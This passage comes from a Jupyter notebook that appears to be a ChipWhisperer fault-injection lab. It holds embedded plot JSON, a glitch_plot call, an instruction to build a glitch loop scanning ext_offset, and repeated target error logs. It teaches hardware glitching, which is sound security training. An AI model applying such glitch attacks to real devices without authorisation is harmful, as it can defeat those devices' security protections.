400px));\\n}\",{\"type\":\"object\",\"name\":\"ImportedStyleSheet\",\"id\":\"p1559\",\"attributes\":{\"url\":\"https://cdn.holoviz.org/panel/1.2.1/dist/css/loading.css\"}},{\"type\":\"object\",\"name\":\"ImportedStyleSheet\",\"id\":\"p1627\",\"attributes\":{\"url\":\"https://cdn.holoviz.org/panel/1.2.1/dist/css/listpanel.css\"}},{\"type\":\"object\",\"name\":\"ImportedStyleSheet\",\"id\":\"p1557\",\"attributes\":{\"url\":\"https://cdn.holoviz.org/panel/1.2.1/dist/bundled/theme/default.css\"}},{\"type\":\"object\",\"name\":\"ImportedStyleSheet\",\"id\":\"p1558\",\"attributes\":{\"url\":\"https://cdn.holoviz.org/panel/1.2.1/dist/bundled/theme/native.css\"}}],\"min_width\":800,\"margin\":0,\"sizing_mode\":\"stretch_width\",\"align\":\"start\",\"children\":[{\"type\":\"object\",\"name\":\"Spacer\",\"id\":\"p1560\",\"attributes\":{\"name\":\"HSpacer10540\",\"stylesheets\":[\"\\n:host(.pn-loading.pn-arc):before, .pn-loading.pn-arc:before {\\n  background-image: url(\\\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHN0eWxlPSJtYXJnaW46IGF1dG87IGJhY2tncm91bmQ6IG5vbmU7IGRpc3BsYXk6IGJsb2NrOyBzaGFwZS1yZW5kZXJpbmc6IGF1dG87IiB2aWV3Qm94PSIwIDAgMTAwIDEwMCIgcHJlc2VydmVBc3BlY3RSYXRpbz0ieE1pZFlNaWQiPiAgPGNpcmNsZSBjeD0iNTAiIGN5PSI1MCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjYzNjM2MzIiBzdHJva2Utd2lkdGg9IjEwIiByPSIzNSIgc3Ryb2tlLWRhc2hhcnJheT0iMTY0LjkzMzYxNDMxMzQ2NDE1IDU2Ljk3Nzg3MTQzNzgyMTM4Ij4gICAgPGFuaW1hdGVUcmFuc2Zvcm0gYXR0cmlidXRlTmFtZT0idHJhbnNmb3JtIiB0eXBlPSJyb3RhdGUiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBkdXI9IjFzIiB2YWx1ZXM9IjAgNTAgNTA7MzYwIDUwIDUwIiBrZXlUaW1lcz0iMDsxIj48L2FuaW1hdGVUcmFuc2Zvcm0+ICA8L2NpcmNsZT48L3N2Zz4=\\\");\\n  background-size: auto calc(min(50%, 400px));\\n}\",{\"id\":\"p1559\"},{\"id\":\"p1557\"},{\"id\":\"p1558\"}],\"margin\":0,\"sizing_mode\":\"stretch_width\",\"align\":\"start\"}},{\"type\":\"object\",\"name\":\"Figure\",\"id\":\"p1571\",\"attributes\":{\"width\":800,\"margin\":[5,10],\"sizing_mode\":\"fixed\",\"align\":\"start\",\"x_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p1561\",\"attributes\":{\"tags\":[[[\"ext_offset\",\"ext_offset\",null]],[]]}},\"y_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p1562\",\"attributes\":{\"tags\":[[[\"offset\",\"offset\",null]],{\"type\":\"map\",\"entries\":[[\"invert_yaxis\",false],[\"autorange\",false]]}]}},\"x_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p1581\"},\"y_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p1582\"},\"title\":{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p1574\",\"attributes\":{\"text_color\":\"black\",\"text_font_size\":\"12pt\"}},\"renderers\":[{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p1607\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p1598\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p1599\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p1600\"},\"data\":{\"type\":\"map\",\"entries\":[[\"ext_offset\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"\"},\"shape\":[0],\"dtype\":\"float64\",\"order\":\"little\"}],[\"offset\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"\"},\"shape\":[0],\"dtype\":\"float64\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p1608\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p1609\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p1604\",\"attributes\":{\"tags\":[\"apply_ranges\"],\"x\":{\"type\":\"field\",\"field\":\"ext_offset\"},\"y\":{\"type\":\"field\",\"field\":\"offset\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#007f00\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#007f00\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#007f00\"},\"marker\":{\"type\":\"value\",\"value\":\"cross\"}}},\"selection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p1610\",\"attributes\":{\"tags\":[\"apply_ranges\"],\"x\":{\"type\":\"field\",\"field\":\"ext_offset\"},\"y\":{\"type\":\"field\",\"field\":\"offset\"},\"size\":{\"type\":\"value\",\"value\":10},\"angle\":{\"type\":\"value\",\"value\":0.0},\"line_color\":{\"type\":\"value\",\"value\":\"#007f00\"},\"line_alpha\":{\"type\":\"value\",\"value\":1.0},\"line_width\":{\"type\":\"value\",\"value\":1},\"line_join\":{\"type\":\"value\",\"value\":\"bevel\"},\"line_cap\":{\"type\":\"value\",\"value\":\"butt\"},\"line_dash\":{\"type\":\"value\",\"value\":[]},\"line_dash_offset\":{\"type\":\"value\",\"value\":0},\"fill_color\":{\"type\":\"value\",\"value\":\"#007f00\"},\"fill_alpha\":{\"type\":\"value\",\"value\":1.0},\"hatch_color\":{\"type\":\"value\",\"value\":\"#007f00\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":1.0},\"hatch_scale\":{\"type\":\"value\",\"value\":12.0},\"hatch_pattern\":{\"type\":\"value\",\"value\":null},\"hatch_weight\":{\"type\":\"value\",\"value\":1.0},\"marker\":{\"type\":\"value\",\"value\":\"cross\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p1605\",\"attributes\":{\"tags\":[\"apply_ranges\"],\"x\":{\"type\":\"field\",\"field\":\"ext_offset\"},\"y\":{\"type\":\"field\",\"field\":\"offset\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#007f00\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#007f00\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#007f00\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"cross\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p1606\",\"attributes\":{\"tags\":[\"apply_ranges\"],\"x\":{\"type\":\"field\",\"field\":\"ext_offset\"},\"y\":{\"type\":\"field\",\"field\":\"offset\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#007f00\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#007f00\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#007f00\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"cross\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p1620\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p1611\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p1612\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p1613\"},\"data\":{\"type\":\"map\",\"entries\":[[\"ext_offset\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"\"},\"shape\":[0],\"dtype\":\"float64\",\"order\":\"little\"}],[\"offset\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"\"},\"shape\":[0],\"dtype\":\"float64\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p1621\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p1622\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p1617\",\"attributes\":{\"tags\":[\"apply_ranges\"],\"x\":{\"type\":\"field\",\"field\":\"ext_offset\"},\"y\":{\"type\":\"field\",\"field\":\"offset\"},\"size\":{\"type\":\"value\",\"value\":10},\"angle\":{\"type\":\"value\",\"value\":0.7853981633974483},\"line_color\":{\"type\":\"value\",\"value\":\"#ff0000\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#ff0000\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#ff0000\"},\"marker\":{\"type\":\"value\",\"value\":\"cross\"}}},\"selection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p1623\",\"attributes\":{\"tags\":[\"apply_ranges\"],\"x\":{\"type\":\"field\",\"field\":\"ext_offset\"},\"y\":{\"type\":\"field\",\"field\":\"offset\"},\"size\":{\"type\":\"value\",\"value\":10},\"angle\":{\"type\":\"value\",\"value\":0.7853981633974483},\"line_color\":{\"type\":\"value\",\"value\":\"#ff0000\"},\"line_alpha\":{\"type\":\"value\",\"value\":1.0},\"line_width\":{\"type\":\"value\",\"value\":1},\"line_join\":{\"type\":\"value\",\"value\":\"bevel\"},\"line_cap\":{\"type\":\"value\",\"value\":\"butt\"},\"line_dash\":{\"type\":\"value\",\"value\":[]},\"line_dash_offset\":{\"type\":\"value\",\"value\":0},\"fill_color\":{\"type\":\"value\",\"value\":\"#ff0000\"},\"fill_alpha\":{\"type\":\"value\",\"value\":1.0},\"hatch_color\":{\"type\":\"value\",\"value\":\"#ff0000\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":1.0},\"hatch_scale\":{\"type\":\"value\",\"value\":12.0},\"hatch_pattern\":{\"type\":\"value\",\"value\":null},\"hatch_weight\":{\"type\":\"value\",\"value\":1.0},\"marker\":{\"type\":\"value\",\"value\":\"cross\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p1618\",\"attributes\":{\"tags\":[\"apply_ranges\"],\"x\":{\"type\":\"field\",\"field\":\"ext_offset\"},\"y\":{\"type\":\"field\",\"field\":\"offset\"},\"size\":{\"type\":\"value\",\"value\":10},\"angle\":{\"type\":\"value\",\"value\":0.7853981633974483},\"line_color\":{\"type\":\"value\",\"value\":\"#ff0000\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#ff0000\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#ff0000\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"cross\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p1619\",\"attributes\":{\"tags\":[\"apply_ranges\"],\"x\":{\"type\":\"field\",\"field\":\"ext_offset\"},\"y\":{\"type\":\"field\",\"field\":\"offset\"},\"size\":{\"type\":\"value\",\"value\":10},\"angle\":{\"type\":\"value\",\"value\":0.7853981633974483},\"line_color\":{\"type\":\"value\",\"value\":\"#ff0000\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#ff0000\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#ff0000\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"cross\"}}}}}],\"toolbar\":{\"type\":\"object\",\"name\":\"Toolbar\",\"id\":\"p1580\",\"attributes\":{\"tools\":[{\"type\":\"object\",\"name\":\"WheelZoomTool\",\"id\":\"p1566\",\"attributes\":{\"tags\":[\"hv_created\"],\"zoom_together\":\"none\"}},{\"type\":\"object\",\"name\":\"HoverTool\",\"id\":\"p1567\",\"attributes\":{\"tags\":[\"hv_created\"],\"renderers\":[{\"id\":\"p1607\"},{\"id\":\"p1620\"}],\"tooltips\":[[\"ext_offset\",\"@{ext_offset}\"],[\"offset\",\"@{offset}\"]]}},{\"type\":\"object\",\"name\":\"SaveTool\",\"id\":\"p1593\"},{\"type\":\"object\",\"name\":\"PanTool\",\"id\":\"p1594\"},{\"type\":\"object\",\"name\":\"BoxZoomTool\",\"id\":\"p1595\",\"attributes\":{\"overlay\":{\"type\":\"object\",\"name\":\"BoxAnnotation\",\"id\":\"p1596\",\"attributes\":{\"syncable\":false,\"level\":\"overlay\",\"visible\":false,\"left_units\":\"canvas\",\"right_units\":\"canvas\",\"bottom_units\":\"canvas\",\"top_units\":\"canvas\",\"line_color\":\"black\",\"line_alpha\":1.0,\"line_width\":2,\"line_dash\":[4,4],\"fill_color\":\"lightgrey\",\"fill_alpha\":0.5}}}},{\"type\":\"object\",\"name\":\"ResetTool\",\"id\":\"p1597\"}],\"active_drag\":{\"id\":\"p1594\"},\"active_scroll\":{\"id\":\"p1566\"}}},\"left\":[{\"type\":\"object\",\"name\":\"LinearAxis\",\"id\":\"p1588\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"BasicTicker\",\"id\":\"p1589\",\"attributes\":{\"mantissas\":[1,2,5]}},\"formatter\":{\"type\":\"object\",\"name\":\"BasicTickFormatter\",\"id\":\"p1590\"},\"axis_label\":\"offset\",\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p1591\"}}}],\"below\":[{\"type\":\"object\",\"name\":\"LinearAxis\",\"id\":\"p1583\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"BasicTicker\",\"id\":\"p1584\",\"attributes\":{\"mantissas\":[1,2,5]}},\"formatter\":{\"type\":\"object\",\"name\":\"BasicTickFormatter\",\"id\":\"p1585\"},\"axis_label\":\"ext_offset\",\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p1586\"}}}],\"center\":[{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p1587\",\"attributes\":{\"axis\":{\"id\":\"p1583\"},\"grid_line_color\":null}},{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p1592\",\"attributes\":{\"dimension\":1,\"axis\":{\"id\":\"p1588\"},\"grid_line_color\":null}}],\"min_border_top\":10,\"min_border_bottom\":10,\"min_border_left\":10,\"min_border_right\":10,\"output_backend\":\"webgl\"}},{\"type\":\"object\",\"name\":\"Spacer\",\"id\":\"p1625\",\"attributes\":{\"name\":\"HSpacer10543\",\"stylesheets\":[\"\\n:host(.pn-loading.pn-arc):before, .pn-loading.pn-arc:before {\\n  background-image: url(\\\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHN0eWxlPSJtYXJnaW46IGF1dG87IGJhY2tncm91bmQ6IG5vbmU7IGRpc3BsYXk6IGJsb2NrOyBzaGFwZS1yZW5kZXJpbmc6IGF1dG87IiB2aWV3Qm94PSIwIDAgMTAwIDEwMCIgcHJlc2VydmVBc3BlY3RSYXRpbz0ieE1pZFlNaWQiPiAgPGNpcmNsZSBjeD0iNTAiIGN5PSI1MCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjYzNjM2MzIiBzdHJva2Utd2lkdGg9IjEwIiByPSIzNSIgc3Ryb2tlLWRhc2hhcnJheT0iMTY0LjkzMzYxNDMxMzQ2NDE1IDU2Ljk3Nzg3MTQzNzgyMTM4Ij4gICAgPGFuaW1hdGVUcmFuc2Zvcm0gYXR0cmlidXRlTmFtZT0idHJhbnNmb3JtIiB0eXBlPSJyb3RhdGUiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBkdXI9IjFzIiB2YWx1ZXM9IjAgNTAgNTA7MzYwIDUwIDUwIiBrZXlUaW1lcz0iMDsxIj48L2FuaW1hdGVUcmFuc2Zvcm0+ICA8L2NpcmNsZT48L3N2Zz4=\\\");\\n  background-size: auto calc(min(50%, 400px));\\n}\",{\"id\":\"p1559\"},{\"id\":\"p1557\"},{\"id\":\"p1558\"}],\"margin\":0,\"sizing_mode\":\"stretch_width\",\"align\":\"start\"}}]}},{\"type\":\"object\",\"name\":\"panel.models.comm_manager.CommManager\",\"id\":\"p1628\",\"attributes\":{\"plot_id\":\"p1556\",\"comm_id\":\"1ed461db2de24903b0b79b96a2e32768\",\"client_comm_id\":\"ae381114f34448e6a36026f406a15eb2\"}}],\"defs\":[{\"type\":\"model\",\"name\":\"ReactiveHTML1\"},{\"type\":\"model\",\"name\":\"FlexBox1\",\"properties\":[{\"name\":\"align_content\",\"kind\":\"Any\",\"default\":\"flex-start\"},{\"name\":\"align_items\",\"kind\":\"Any\",\"default\":\"flex-start\"},{\"name\":\"flex_direction\",\"kind\":\"Any\",\"default\":\"row\"},{\"name\":\"flex_wrap\",\"kind\":\"Any\",\"default\":\"wrap\"},{\"name\":\"justify_content\",\"kind\":\"Any\",\"default\":\"flex-start\"}]},{\"type\":\"model\",\"name\":\"FloatPanel1\",\"properties\":[{\"name\":\"config\",\"kind\":\"Any\",\"default\":{\"type\":\"map\"}},{\"name\":\"contained\",\"kind\":\"Any\",\"default\":true},{\"name\":\"position\",\"kind\":\"Any\",\"default\":\"right-top\"},{\"name\":\"offsetx\",\"kind\":\"Any\",\"default\":null},{\"name\":\"offsety\",\"kind\":\"Any\",\"default\":null},{\"name\":\"theme\",\"kind\":\"Any\",\"default\":\"primary\"},{\"name\":\"status\",\"kind\":\"Any\",\"default\":\"normalized\"}]},{\"type\":\"model\",\"name\":\"GridStack1\",\"properties\":[{\"name\":\"mode\",\"kind\":\"Any\",\"default\":\"warn\"},{\"name\":\"ncols\",\"kind\":\"Any\",\"default\":null},{\"name\":\"nrows\",\"kind\":\"Any\",\"default\":null},{\"name\":\"allow_resize\",\"kind\":\"Any\",\"default\":true},{\"name\":\"allow_drag\",\"kind\":\"Any\",\"default\":true},{\"name\":\"state\",\"kind\":\"Any\",\"default\":[]}]},{\"type\":\"model\",\"name\":\"drag1\",\"properties\":[{\"name\":\"slider_width\",\"kind\":\"Any\",\"default\":5},{\"name\":\"slider_color\",\"kind\":\"Any\",\"default\":\"black\"},{\"name\":\"value\",\"kind\":\"Any\",\"default\":50}]},{\"type\":\"model\",\"name\":\"click1\",\"properties\":[{\"name\":\"terminal_output\",\"kind\":\"Any\",\"default\":\"\"},{\"name\":\"debug_name\",\"kind\":\"Any\",\"default\":\"\"},{\"name\":\"clears\",\"kind\":\"Any\",\"default\":0}]},{\"type\":\"model\",\"name\":\"FastWrapper1\",\"properties\":[{\"name\":\"object\",\"kind\":\"Any\",\"default\":null},{\"name\":\"style\",\"kind\":\"Any\",\"default\":null}]},{\"type\":\"model\",\"name\":\"NotificationAreaBase1\",\"properties\":[{\"name\":\"js_events\",\"kind\":\"Any\",\"default\":{\"type\":\"map\"}},{\"name\":\"position\",\"kind\":\"Any\",\"default\":\"bottom-right\"},{\"name\":\"_clear\",\"kind\":\"Any\",\"default\":0}]},{\"type\":\"model\",\"name\":\"NotificationArea1\",\"properties\":[{\"name\":\"js_events\",\"kind\":\"Any\",\"default\":{\"type\":\"map\"}},{\"name\":\"notifications\",\"kind\":\"Any\",\"default\":[]},{\"name\":\"position\",\"kind\":\"Any\",\"default\":\"bottom-right\"},{\"name\":\"_clear\",\"kind\":\"Any\",\"default\":0},{\"name\":\"types\",\"kind\":\"Any\",\"default\":[{\"type\":\"map\",\"entries\":[[\"type\",\"warning\"],[\"background\",\"#ffc107\"],[\"icon\",{\"type\":\"map\",\"entries\":[[\"className\",\"fas fa-exclamation-triangle\"],[\"tagName\",\"i\"],[\"color\",\"white\"]]}]]},{\"type\":\"map\",\"entries\":[[\"type\",\"info\"],[\"background\",\"#007bff\"],[\"icon\",{\"type\":\"map\",\"entries\":[[\"className\",\"fas fa-info-circle\"],[\"tagName\",\"i\"],[\"color\",\"white\"]]}]]}]}]},{\"type\":\"model\",\"name\":\"Notification\",\"properties\":[{\"name\":\"background\",\"kind\":\"Any\",\"default\":null},{\"name\":\"duration\",\"kind\":\"Any\",\"default\":3000},{\"name\":\"icon\",\"kind\":\"Any\",\"default\":null},{\"name\":\"message\",\"kind\":\"Any\",\"default\":\"\"},{\"name\":\"notification_type\",\"kind\":\"Any\",\"default\":null},{\"name\":\"_destroyed\",\"kind\":\"Any\",\"default\":false}]},{\"type\":\"model\",\"name\":\"TemplateActions1\",\"properties\":[{\"name\":\"open_modal\",\"kind\":\"Any\",\"default\":0},{\"name\":\"close_modal\",\"kind\":\"Any\",\"default\":0}]},{\"type\":\"model\",\"name\":\"BootstrapTemplateActions1\",\"properties\":[{\"name\":\"open_modal\",\"kind\":\"Any\",\"default\":0},{\"name\":\"close_modal\",\"kind\":\"Any\",\"default\":0}]},{\"type\":\"model\",\"name\":\"MaterialTemplateActions1\",\"properties\":[{\"name\":\"open_modal\",\"kind\":\"Any\",\"default\":0},{\"name\":\"close_modal\",\"kind\":\"Any\",\"default\":0}]}]}};\n",
       "  var render_items = [{\"docid\":\"d97b3c3b-638e-4741-81ce-9814aa90f440\",\"roots\":{\"p1556\":\"a59aedfe-eb93-4b49-ae4a-6816f728a002\"},\"root_ids\":[\"p1556\"]}];\n",
       "  var docs = Object.values(docs_json)\n",
       "  if (!docs) {\n",
       "    return\n",
       "  }\n",
       "  const py_version = docs[0].version.replace('rc', '-rc.').replace('.dev', '-dev.')\n",
       "  const is_dev = py_version.indexOf(\"+\") !== -1 || py_version.indexOf(\"-\") !== -1\n",
       "  function embed_document(root) {\n",
       "    var Bokeh = get_bokeh(root)\n",
       "    Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "    for (const render_item of render_items) {\n",
       "      for (const root_id of render_item.root_ids) {\n",
       "\tconst id_el = document.getElementById(root_id)\n",
       "\tif (id_el.children.length && (id_el.children[0].className === 'bk-root')) {\n",
       "\t  const root_el = id_el.children[0]\n",
       "\t  root_el.id = root_el.id + '-rendered'\n",
       "\t}\n",
       "      }\n",
       "    }\n",
       "  }\n",
       "  function get_bokeh(root) {\n",
       "    if (root.Bokeh === undefined) {\n",
       "      return null\n",
       "    } else if (root.Bokeh.version !== py_version && !is_dev) {\n",
       "      if (root.Bokeh.versions === undefined || !root.Bokeh.versions.has(py_version)) {\n",
       "\treturn null\n",
       "      }\n",
       "      return root.Bokeh.versions.get(py_version);\n",
       "    } else if (root.Bokeh.version === py_version) {\n",
       "      return root.Bokeh\n",
       "    }\n",
       "    return null\n",
       "  }\n",
       "  function is_loaded(root) {\n",
       "    var Bokeh = get_bokeh(root)\n",
       "    return (Bokeh != null && Bokeh.Panel !== undefined)\n",
       "  }\n",
       "  if (is_loaded(root)) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    var attempts = 0;\n",
       "    var timer = setInterval(function(root) {\n",
       "      if (is_loaded(root)) {\n",
       "        clearInterval(timer);\n",
       "        embed_document(root);\n",
       "      } else if (document.readyState == \"complete\") {\n",
       "        attempts++;\n",
       "        if (attempts > 200) {\n",
       "          clearInterval(timer);\n",
       "\t  var Bokeh = get_bokeh(root)\n",
       "\t  if (Bokeh == null || Bokeh.Panel == null) {\n",
       "            console.warn(\"Panel: ERROR: Unable to run Panel code because Bokeh or Panel library is missing\");\n",
       "\t  } else {\n",
       "\t    console.warn(\"Panel: WARNING: Attempting to render but not all required libraries could be resolved.\")\n",
       "\t    embed_document(root)\n",
       "\t  }\n",
       "        }\n",
       "      }\n",
       "    }, 25, root)\n",
       "  }\n",
       "})(window);</script>"
      ],
      "text/plain": [
       ":DynamicMap   []\n",
       "   :Overlay\n",
       "      .Points.I  :Points   [ext_offset,offset]\n",
       "      .Points.II :Points   [ext_offset,offset]"
      ]
     },
     "execution_count": 14,
     "metadata": {
      "application/vnd.holoviews_exec.v0+json": {
       "id": "p1556"
      }
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "gc.glitch_plot(plotdots={\"success\":\"+g\", \"reset\":\"xr\", \"normal\":None}, x_index=\"ext_offset\", y_index=\"offset\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "And make a glitch loop. Make sure you use some successful settings that you found in the previous lab, since it will make this one much shorter!\n",
    "\n",
    "One change you probably want to make is to add a scan for ext_offset. The number of places we can insert a successful glitch has gone way down. Doing this will also be very important for future labs."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n",
      "CWbytearray(b'01')\n",
      "0.78125 -3.90625 4\n",
      "🐙"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:410) Unexpected length 0, 1\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:184) Infinite loop in unstuff data\n",
      "(ChipWhisperer Target ERROR|File SimpleSerial2.py:185) CWbytearray(b'00 00 00 00 00 00')\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:377) Unexpected start to command 0\n",
